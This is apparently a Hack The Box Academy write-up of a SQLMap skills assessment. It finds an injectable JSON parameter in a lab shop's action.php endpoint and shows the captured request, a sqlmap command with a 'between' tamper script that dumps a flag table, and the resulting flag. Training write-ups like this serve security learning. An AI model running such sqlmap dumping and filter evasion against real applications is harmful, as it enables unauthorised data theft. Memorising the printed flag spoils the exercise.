---
sticker: lucide//database-backup
---
You are given access to a web application with basic protection mechanisms. Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. To complete this module, find the flag and submit it here.

![Pasted image 20250204180837.png](../../../IMAGES/Pasted%20image%2020250204180837.png)

Once we go into the site, we can see the following:

![Pasted image 20250204180851.png](../../../IMAGES/Pasted%20image%2020250204180851.png)

Seems like a simple shoe shop, we have three interesting options we should take a look at: `Contact`, `Catalog`, `Blog`. We need to search around for some of them that injects code in the back-end server, let's take a look:

## Contact


![Pasted image 20250204181046.png](../../../IMAGES/Pasted%20image%2020250204181046.png)

In the contact site, we can see a form that we can fill in order to get in contact with the administrators. Nothing is off in this page, everything sets itself to `#`, so this is not what we're looking for.

## Blog
---

![Pasted image 20250204181231.png](../../../IMAGES/Pasted%20image%2020250204181231.png)

We have a search bar, but the same stuff happens as with the contact site, it gets set to `#`.

## Catalog
---

If we go to the catalog section, we can go into a `shop.html` site, if we inspect the source code for this page, we can see this interesting code:

```
<script>
 $(".add-to-cart").click(function(event) {
 event.preventDefault();

 let xhr = new XMLHttpRequest(); 
 let url = "action.php"; 
 
 xhr.open("POST", url, true); 
 xhr.setRequestHeader("Content-Type", "application/json"); 

 xhr.onreadystatechange = function () {
 if (xhr.readyState === 4 && xhr.status === 200) { 
 alert("Item added!!!")
 }
 };

 var data = JSON.stringify({ "id": 1 }); 
 xhr.send(data); 
 });
 </script>
```

The code basically acts whenever the `add-to-cart` button is clicked, the script posts a JSON object to the `action.php` endpoint.

We must capture the request with burp and use this command:

```
POST /action.php HTTP/1.1

Host: 94.237.53.230:33942

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/json

Content-Length: 8

Origin: http://94.237.53.230:33942

Connection: keep-alive

Referer: http://94.237.53.230:33942/shop.html

Priority: u=0



{"id":1}
```

```
python3 sqlmap.py -r Add-To-Cart.txt --threads 10 --tamper=between -T final_flag --dump --batch
```

We get the following:

```
Database: production
Table: final_flag
[1 entry]
+----+--------------------------+
| id | content |
+----+--------------------------+
| 1 | HTB{n07_50_h4rd_r16h7?!} |
+----+--------------------------+
```

Flag is `HTB{n07_50_h4rd_r16h7?!}`


![Pasted image 20250204183428.png](../../../IMAGES/Pasted%20image%2020250204183428.png)
